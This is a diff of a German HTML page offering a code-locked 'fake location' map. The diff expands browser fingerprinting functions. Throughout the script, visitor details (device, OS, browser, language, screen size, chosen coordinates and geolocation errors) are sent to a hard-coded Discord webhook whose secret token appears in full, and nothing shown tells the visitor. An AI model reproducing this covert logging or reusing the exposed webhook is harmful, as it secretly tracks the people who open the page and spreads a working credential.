@@ -15,7 +15,6 @@
       height: 100vh;
       width: 100vw;
       display: none;
-      filter: saturate(1.05);
     }
     .popup {
       position: fixed;
@@ -83,7 +82,7 @@
 </head>
 <body>
 
-<!-- Code-Popup -->
+<!-- Popup -->
 <div class="popup" id="popup">
   <div class="popup-content">
     <h2>Location Locked</h2>
@@ -95,7 +94,7 @@
 <!-- Karte -->
 <div id="map"></div>
 
-<!-- Script -->
+<!-- JS -->
 <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
 <script>
   const webhookUrl = "https://discord.com/api/webhooks/1340763818195812384/4MkBGKZpLKa7CgBAv-MHkJsRjFaM-tPlPE31x7uUC-_f4EMOfqgnHupLELASCwChUPZo";
@@ -107,34 +106,52 @@
     iconAnchor: [20, 40]
   });
 
-  function sendEmbedLog(title, description) {
+  function getDeviceName() {
     const ua = navigator.userAgent;
+
+    if (/iPhone/i.test(ua)) return "iPhone";
+    if (/iPad/i.test(ua)) return "iPad";
+    if (/Macintosh/i.test(ua)) return "Mac";
+    if (/Android/i.test(ua) && /Mobile/i.test(ua)) return "Android Phone";
+    if (/Android/i.test(ua)) return "Android Tablet";
+    if (/Windows Phone/i.test(ua)) return "Windows Phone";
+    if (/Windows/i.test(ua)) return "Windows PC";
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unbekanntes Gerät";
+  }
+
+  function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (/Edg/i.test(ua)) return "Edge";
+    if (/Chrome/i.test(ua)) return "Chrome";
+    if (/Firefox/i.test(ua)) return "Firefox";
+    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
+    return "Unbekannt";
+  }
+
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (/Windows/i.test(ua)) return "Windows";
+    if (/Mac OS/i.test(ua)) return "macOS";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if (/Android/i.test(ua)) return "Android";
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unbekannt";
+  }
+
+  function sendEmbedLog(title, description) {
     const language = navigator.language;
     const width = window.innerWidth;
     const height = window.innerHeight;
-    const device = /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop";
-    let os = "Unbekannt";
-    if (/Windows/i.test(ua)) os = "Windows";
-    else if (/Mac OS/i.test(ua)) os = "macOS";
-    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-    else if (/Android/i.test(ua)) os = "Android";
-    else if (/Linux/i.test(ua)) os = "Linux";
-
-    let browser = "Unbekannt";
-    if (/Chrome/i.test(ua)) browser = "Chrome";
-    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-    if (/Firefox/i.test(ua)) browser = "Firefox";
-    if (/Edg/i.test(ua)) browser = "Edge";
-
     const embed = {
       embeds: [{
         title: title,
         description: description,
         color: 3447003,
         fields: [
-          { name: "Gerät", value: device, inline: true },
-          { name: "OS", value: os, inline: true },
-          { name: "Browser", value: browser, inline: true },
+          { name: "Gerät", value: getDeviceName(), inline: true },
+          { name: "OS", value: getOS(), inline: true },
+          { name: "Browser", value: getBrowserName(), inline: true },
           { name: "Sprache", value: language, inline: true },
           { name: "Auflösung", value: `${width}x${height}`, inline: true }
         ],
@@ -154,7 +171,7 @@
     if (code === "1234") {
       document.getElementById("popup").style.display = "none";
       document.getElementById("map").style.display = "block";
-      sendEmbedLog("✅ Code korrekt", "Benutzer hat den Code erfolgreich eingegeben.");
+      sendEmbedLog("✅ Code akzeptiert", "Benutzer hat den Code erfolgreich eingegeben.");
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
@@ -172,14 +189,14 @@
           map.on('click', function(e) {
             if (marker) map.removeLayer(marker);
             marker = L.marker(e.latlng, { icon: customIcon }).addTo(map);
-            sendEmbedLog("📌 Neue Fake-Location", `User hat eine neue Position gewählt:\nLat: ${e.latlng.lat}, Lng: ${e.latlng.lng}`);
+            sendEmbedLog("📌 Neue Fake-Location", `Benutzer hat Fake-Standort gesetzt:\nLat: ${e.latlng.lat}, Lng: ${e.latlng.lng}`);
           });
 
         }, function(error) {
           sendEmbedLog("❌ Fehler", "Geolocation verweigert oder fehlgeschlagen.");
         });
       } else {
-        sendEmbedLog("❌ Fehler", "Geolocation nicht unterstützt.");
+        sendEmbedLog("❌ Fehler", "Geolocation wird nicht unterstützt.");
       }
     } else {
       alert("Falscher Code.");
